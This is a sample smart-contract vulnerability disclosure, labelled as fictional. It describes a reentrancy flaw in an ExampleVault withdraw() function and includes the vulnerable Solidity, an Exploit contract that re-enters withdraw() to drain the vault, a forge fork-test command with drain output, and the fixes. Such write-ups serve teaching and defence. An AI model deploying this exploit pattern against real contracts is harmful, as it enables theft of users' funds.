---
title: "Reentrancy in ExampleVault.withdraw() allows draining of share reserves"
summary: "A missing state update before an external call lets an attacker re-enter withdraw() and redeem the same shares repeatedly, draining the vault's underlying reserves."
severity: critical
status: fixed
target: "ExampleVault (sample entry)"
date: 2026-09-16
reportedAt: 2026-08-21
fixedAt: 2026-09-02
cvss: 9.1
bounty: "$25,000"
tags: ["solidity", "reentrancy", "evm", "defi", "sample"]
references:
  - label: "EIP-1153: Transient storage opcodes"
    url: "https://eips.ethereum.org/EIPS/eip-1153"
  - label: "OpenZeppelin ReentrancyGuard"
    url: "https://docs.openzeppelin.com/contracts/5.x/api/utils#ReentrancyGuard"
---

> **This is a sample entry** used to exercise the site's markdown rendering. The target
> is fictional. Delete `src/content/disclosures/example-vault-reentrancy.md` once you
> publish a real disclosure.

## Summary

`ExampleVault.withdraw()` transfers the underlying asset to the caller **before** burning the
caller's shares. Because the transfer hands control to an attacker-controlled contract, the
attacker can re-enter `withdraw()` while their share balance is still non-zero and redeem the
same shares an unbounded number of times.

The result is complete loss of the vault's underlying reserves, bounded only by gas.

## Affected code

The vulnerable path is the ordering of the final two statements:

```solidity
// ExampleVault.sol — vulnerable
function withdraw(uint256 shares) external {
    require(shares > 0, "zero");
    require(balanceOf[msg.sender] >= shares, "insufficient");

    uint256 amount = (shares * totalAssets()) / totalSupply;

    // ❌ external call happens while balanceOf[msg.sender] is still unchanged
    (bool ok, ) = msg.sender.call{value: amount}("");
    require(ok, "transfer failed");

    balanceOf[msg.sender] -= shares;   // state update is too late
    totalSupply            -= shares;
}
```

The `call` yields execution to `msg.sender`. At that moment the accounting still reflects the
attacker's full pre-withdrawal balance, so the `require` on line 3 passes again on re-entry.

## Impact

| Property | Assessment |
| --- | --- |
| Confidentiality | None |
| Integrity | High — share accounting is corrupted |
| Availability | High — reserves fully drained |
| Attack complexity | Low, no special privileges required |
| Precondition | Attacker holds ≥ 1 wei of shares |

An attacker needs only a single share to begin. Each re-entry multiplies the payout, so the
cost to exploit is roughly one deployment plus gas.

## Proof of concept

The exploit contract re-enters from its `receive()` hook until the vault is empty:

```solidity
contract Exploit {
    ExampleVault immutable vault;
    uint256 private shares;

    constructor(ExampleVault _vault) payable {
        vault = _vault;
        vault.deposit{value: msg.value}();
        shares = vault.balanceOf(address(this));
    }

    function attack() external {
        vault.withdraw(shares);
    }

    receive() external payable {
        // Re-enter while our share balance is still intact.
        if (address(vault).balance >= msg.value) {
            vault.withdraw(shares);
        }
    }
}
```

Run it against a local fork:

```bash
forge test --match-test testReentrancyDrain -vvvv \
  --fork-url "$RPC_URL" --fork-block-number 21_400_000
```

Observed output, abbreviated:

```
[PASS] testReentrancyDrain() (gas: 412,338)
  vault balance before : 1000.000000000000000000 ETH
  attacker deposit     :    1.000000000000000000 ETH
  vault balance after  :    0.000000000000000000 ETH
  attacker profit      :  999.000000000000000000 ETH
```

## Remediation

Two changes, either of which closes the hole; the vendor applied both.

1. **Reorder to checks-effects-interactions.** Burn the shares before the transfer:

   ```solidity
   balanceOf[msg.sender] -= shares;
   totalSupply           -= shares;

   (bool ok, ) = msg.sender.call{value: amount}("");
   require(ok, "transfer failed");
   ```

2. **Add a reentrancy guard** on every state-mutating entry point, so future refactors cannot
   reintroduce the issue. With Solidity ≥ 0.8.24 a transient-storage guard costs ~100 gas:

   ```solidity
   modifier nonReentrant() {
       assembly { if tload(0) { revert(0, 0) } tstore(0, 1) }
       _;
       assembly { tstore(0, 0) }
   }
   ```

Note that fix (1) alone is sufficient here, but `deposit()` and `redeem()` share the same
callback surface — guarding all three was the safer call.

## Timeline

- **2026-08-21** — Reported to the vendor via their security contact.
- **2026-08-22** — Triaged and confirmed; severity agreed as critical.
- **2026-09-02** — Patch deployed to mainnet; reserves migrated to the fixed vault.
- **2026-09-16** — Public disclosure, coordinated with the vendor.
